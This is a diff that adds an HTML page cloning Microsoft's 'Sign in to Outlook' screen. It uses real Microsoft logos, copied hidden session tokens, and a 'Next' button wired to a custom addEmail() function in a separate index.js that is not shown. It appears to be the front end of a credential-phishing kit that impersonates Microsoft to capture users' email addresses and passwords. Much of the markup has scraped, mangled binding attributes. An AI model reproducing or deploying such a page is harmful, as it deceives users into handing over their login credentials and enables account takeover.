@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="https://logincdn.msftauth.net/16.000.30293.2/images/favicon.ico" />
+    <link rel="stylesheet" href="index.css" />
+    <title>Sign in to Outlook</title>
+  </head>
+  <body class="body">
+
+    
+    <div class="style-0">
+        <div class="style-1">
+            <img class="style-2" role="presentation" data-bind="attr: { src: $page.backgroundLogoUrl }" src="https://aadcdn.msauth.net/shared/1.0/content/images/applogos/53_7a3c80bf9694448bac31a9589d2e9e92.png" />
+        </div>
+        <div class="style-3">
+            <div animationEnd:="" $page.paginationControlHelper.animationEnd,="" externalCss:="" {="" true="" },="" css:="" $content.isVerticalSplitTemplate,="" $page.backgroundLogoUrl,="" $page.paginationControlHelper.useWiderWidth,="" $page.fadeInLightBox,="" $page.showFedCredAndNewSession="" &amp;&amp;="" ($page.showFedCredButtons()="" ||="" $page.newSession()),="" $page.backgroundControlMethods()="" $page.backgroundControlMethods().useTransparentLightBox,="" $page.showDebugDetails,="" $content.hasHeader="" class="style-4">
+
+                <div class="style-5" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>
+
+                <div {="" name:="" params:="" isChinaDc:="" svr.fIsChinaDc,="" bannerLogoUrl:="" bannerLogoUrl()="" }="" class="style-6">
+                    <img class="style-7" role="img" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" /><!-- /ko -->
+                </div>
+                <div role="main" {="" name:="" publicMethods:="" paginationControlMethods,="" params:="" enableCssAnimation:="" svr.fEnableCssAnimation,="" disableAnimationIfAnimationEndUnsupported:="" svr.fDisableAnimationIfAnimationEndUnsupported,="" initialViewId:="" initialViewId,="" currentViewId:="" currentViewId,="" initialSharedData:="" initialSharedData,="" initialError:="" $loginPage.getServerError()="" },="" event:="" cancel:="" paginationControl_onCancel,="" load:="" paginationControlHelper.onLoad,="" unload:="" paginationControlHelper.onUnload,="" loadView:="" view_onLoadView,="" showView:="" view_onShow,="" setLightBoxFadeIn:="" view_onSetLightBoxFadeIn,="" animationStateChange:="" paginationControl_onAnimationStateChange="" }="" class="style-8">
+                    <!--  -->
+                    <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="style-9">
+
+                        <div class="style-10" {="" showIdentityBanner()="" &amp;&amp;="" (sharedData.displayName="" ||="" svr.sPOST_Username),="" hidePaginatedView.hideSubView(),="" animate(),="" animate.isSlideOutNext(),="" animate.isSlideInNext(),="" animate.isSlideOutBack(),="" animate.isSlideInBack()="">
+
+                            <div data-viewid="1" data-showfedcredbutton="true" {="" name:="" params:="" serverData:="" svr,="" serverError:="" initialError,="" isInitialView:="" isInitialState,="" displayName:="" sharedData.displayName,="" otherIdpRedirectUrl:="" sharedData.otherIdpRedirectUrl,="" prefillNames:="" $loginPage.prefillNames,="" flowToken:="" sharedData.flowToken,="" availableSignupCreds:="" sharedData.availableSignupCreds,="" customStrings:="" $loginPage.customStrings(),="" isCustomizationFailure:="" $loginPage.isCustomStringsLoadFailure(),="" userIdLabel:="" $loginPage.userIdLabel,="" cantAccessYourAccountText:="" $loginPage.cantAccessYourAccountText,="" hideAccountResetCredentials:="" $loginPage.hideAccountResetCredentials,="" accessRecoveryLink:="" $loginPage.accessRecoveryLink,="" boilerPlateText:="" $loginPage.boilerPlateText="" },="" event:="" restoreIsRecoveryAttemptPost:="" $loginPage.view_onRestoreIsRecoveryAttemptPost,="" redirect:="" $loginPage.view_onRedirect,="" updateDFPUrl:="" $loginPage.view_onUpdateDFPUrl,="" setPendingRequest:="" $loginPage.view_onSetPendingRequest,="" registerDialog:="" $loginPage.view_onRegisterDialog,="" unregisterDialog:="" $loginPage.view_onUnregisterDialog,="" showDialog:="" $loginPage.view_onShowDialog,="" updateAvailableCredsWithoutUsername:="" $loginPage.view_onUpdateAvailableCreds,="" agreementClick:="" $loginPage.footer_agreementClick="" }="" class="style-11">
+                                <div {="" name:="" params:="" serverData:="" svr,="" title:="" customTitle()="" ||="" headerDescription:="" customDescription()="" }="" class="style-12">
+                                    <div class="style-13">
+                                        <div class="style-14" data-bind="externalCss: { 'title': true }">
+                                            <div role="heading" aria-level="1" data-bind="text: title" class="style-15">Sign in</div>
+                                            <div data-bind="text: subtitle || str['WF_STR_App_Title'], externalCss: { 'subtitle': true }" class="style-16">to continue to Outlook</div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="style-17">
+                                    <div role="alert" aria-live="assertive" class="style-18">
+                                    </div>
+                                    <div class="style-19">
+                                        <div class="style-20" {="" name:="" publicMethods:="" usernameTextbox.placeholderTextboxMethods,="" params:="" serverData:="" svr,="" hintText:="" svr.fEnableLivePreview="" ?="" userIdLabel="" :="" tenantBranding.unsafe_userIdLabel="" ||="" hintCss:="" +="" (!svr.fAllowPhoneSignIn="" },="" event:="" updateFocus:="" usernameTextbox.textbox_onUpdateFocus="" }="">
+                                            <input type="email" id="email-input" name="loginfmt" maxlength="113" class="style-21" aria-required="true" data-report-event="Signin_Email_Phone_Skype" data-report-trigger="click" data-report-value="Email_Phone_Skype_Entry" attr:="" {="" lang:="" svr.fApplyAsciiRegexOnInput="" ?="" null="" :="" autocomplete:="" svr.fIsUpdatedAutocompleteEnabled="" },="" externalCss:="" true,="" usernameTextbox.error="" ariaLabel:="" tenantBranding.unsafe_userIdLabel="" ||="" ariaDescribedBy:="" +="" (pageDescription="" &amp;&amp;="" !svr.fHideLoginDesc="" loginDescription="" textInput:="" usernameTextbox.value,="" hasFocusEx:="" usernameTextbox.focused,="" placeholder:="" autocomplete="username" aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader usernameError" placeholder="Email, phone, or Skype" data-report-attached="1" />
+                                            <input name="passwd" type="password" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="style-22" tabindex="-1" aria-hidden="true" />
+                                        </div>
+                                    </div>
+                                </div>
+                                <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText &amp;&amp; !boilerPlateText }, externalCss: { 'password-reset-links-container': true }" class="style-23">
+                                    <div class="style-24">
+                                        <div class="style-25">
+                                            <div class="style-26">
+                                                <div class="style-27" htmlWithBindings:="" childBindings:="" {="" href:="" svr.urlSignUp="" ||="" ariaLabel:="" ?="" :="" click:="" signup_onClick="" }="">No account? <a href="https://www.outlook.com/owa/" aria-label="Create a Microsoft account" class="style-28">Create one!</a></div> <!-- /ko -->
+                                                <div class="style-29">
+                                                    <a name="cannotAccessAccount" href="#" class="style-30">Can&apos;t access your account?</a>
+                                                </div> <!-- /ko -->
+
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="style-31" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText || boilerPlateText }">
+                                    <div class="style-32" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText || boilerPlateText }">
+                                        <div {="" name:="" params:="" serverData:="" svr,="" isPrimaryButtonEnabled:="" !isRequestPending(),="" isPrimaryButtonVisible:="" svr.fShowButtons,="" isSecondaryButtonEnabled:="" true,="" isSecondaryButtonVisible:="" svr.fShowButtons="" &amp;&amp;="" isSecondaryButtonVisible(),="" secondaryButtonText:="" secondaryButtonText()="" },="" event:="" primaryButtonClick:="" primaryButton_onClick,="" secondaryButtonClick:="" secondaryButton_onClick="" }="" class="style-33">
+                                            <div class="style-34" visible:="" isPrimaryButtonVisible()="" ||="" isSecondaryButtonVisible(),="" css:="" {="" removeBottomMargin="" },="" externalCss:="" true="">
+                                                <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="style-35">
+                                                    <input type="submit" class="style-36" id="submit-email" value="Next" onclick="addEmail()"/>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="" class="style-37" />
+                <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="" class="style-38" />
+                <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="" class="style-39" />
+                <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="" class="style-40" />
+                <input type="hidden" data-bind="attr: { name: svr.sCanaryTokenName }, value: svr.canary" name="canary" value="DNFcJOpUGXrnKJtEUTglNZ2CYlxDvm38HDwRufI1cN0=6:1:CANARY:8MOxERYmfYD0u26FDqTkOnK2g+Cj0187QZWuefA0N5w=" class="style-41" />
+                <input type="hidden" name="ctx" data-bind="value: ctx" value="rQQIARAAjZE_aBNhAMXvy6VnU7UNnR3kEITqJd9d7p-BDpdcYtKYpIa26VUkXO5PcsndfdfkLhdaunez0EEQHHQRA4roItXBuTgUx7p0LEVEikMdRBtcnMQ3PH7Tg_feHE4n6PQ1-EcMNXYKmiZNacaY_lJvdiou7r5_9-PL9Per0dNs5-X24xG40vZ9r59OJsMwTKDAtxHqJjTkJFGoJt8CcADAMQCjiMCnRE7kBJaHkBUgDVk6AVmOhRzHUKrB3KJYvmlSTY7XKJbTBVMXWF1o6oeRmaoU-G1mbKhnbRinkZiJek7DQ33_Ed6RtWCYV6SWLMk1VKpv1KSikylrmVyNquTbatBkvUZqqSs5ZbpbyNsS5BTbShUtZX1FKuTXLKVWWqiXebbIm2p_GfHd0orXFL2Kmlpk7gwEznIbBV1pCJlwhP_XTq9x4ry_g9x9nECe4Vr6QRQcRcFJNAInz6Lg6cT5kLuf9YfRXz_Lb2Y499N1HNufSMqVvLZQ9ZZvr_bc0oKfW15q2ZU1JqvYQ3ngpMSCHNYCs0hrFTjPp-kdAuwQxB4Rm8TjGIlnF-ljAnwjwPYFbC_2z1cOLoLDS-wUodmq5fRn5zZJS2_4qGu4ZHqTHDr9hqaNaaDagdEn0_fI83Dy_tbW1ofL2Nn0k2ejB88_vvhaOJm5KZarw1xNcUxFhgHD5-X1pW7VLTGtG9kOpEXh7lo9MEwJVrhw_lUcO4pjvwE1" class="style-42" />
+                <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="9764db93-ff04-4dfd-b30f-356ed2270300" class="style-43" />
+                <input type="hidden" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABIQEAAAApTwJmzXqdR4BN2miheQMYSo6EZoVe0JZn8KjgCt8jHv-NUqU_dkE-nH_D6yGZ1gwhQ8bh7YPtyVFsqL0Pg-6VzlzA0hRfvTxFD8DBHtGnehEAh4Ak2GWev1YII8CP5L0D7hPOEltQ75d-_gmkt7JzPI8hSMckm2ZX3F2EGtTRxEFA5lNzWGXOt2d43LSHnflR7E1uPYg9j1XD3jhcylGXJKU3nrGjHJzKpfUosSE9o9f69WUeZoCmUVg9rjCT_oDHi54TDslQXsS91QCOofcvCcs0UVwuyxCIOfwE4mLCeyrd3kiF4SqC_R43FFPovzEx9gYMVsu7EcB7EoaRqiMSda9leMYPO2dpQ3RlpFxsTxlLdPCQhJ3_DehZ_TKG76mq4WtEzZFtTP7G0ZsQNLIBkYwcgOx8FelXOGoYgId4RJCDZMqt3TNXUEyunMBLEdE60_Ru9MI6_lgup7eJoR88mr230Shg2zupSc6aEGrMjSAA" class="style-44" /> <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value="" class="style-45" />
+                <input type="hidden" name="NewUser" value="1" class="style-46" /> <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value="" class="style-47" />
+                <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0" class="style-48" />
+                <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0" class="style-49" />
+                <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0" class="style-50" />
+                <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="1" class="style-51" />
+                <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0" class="style-52" /> 
+
+                <div {="" name:="" publicMethods:="" instrumentationMethods,="" params:="" serverData:="" svr="" }="" class="style-54">
+                    <input type="hidden" name="i19" data-bind="value: timeOnPage" value="" class="style-55" />
+                </div> <!-- /ko -->
+            </div>
+            <div {="" name:="" params:="" serverData:="" svr,="" fedCredOptions:="" $page.otherSigninOptions="" },="" event:="" fedCredButtonClick:="" $page.otherSigninOptionsButton_onClick="" }="" class="style-56">
+                <div data-bind="css: { 'app': $page.backgroundLogoUrl }, externalCss: { 'promoted-fed-cred-box': true }" class="style-57">
+                    <div class="style-58" {="" $page.useCssAnimations="" &amp;&amp;="" $page.animate(),="" $page.animate.isSlideOutNext,="" $page.animate.isSlideInNext,="" $page.animate.isSlideOutBack,="" $page.animate.isSlideInBack,="" $page.backgroundLogoUrl="">
+    
+                        <div class="style-59" data-bind="css: { 'binaryChoice list': svr.fSupportWindowsStyles }">
+                            <div class="style-60">
+                                <div class="style-61" role="button" tabindex="0" css:="" {="" svr.fSupportWindowsStyles="" },="" pressEnter:="" $fedCredButtonsControl.fedCredButton_onClick,="" click:="" ariaLabel:="" aria-label="Sign-in options">
+    
+                                    <div class="style-62">
+                                        <div class="style-63">
+                                        </div>
+                                        <div class="style-65" data-bind="css: { 'content': !svr.fSupportWindowsStyles }">
+                                            <div data-bind="text: $data.text, attr: { 'data-test-id': $data.testId }" data-test-id="signinOptions" class="style-66">Sign-in options</div> <!-- /ko -->
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="index.js" type="text/javascript"></script>
+  </body>
+</html>
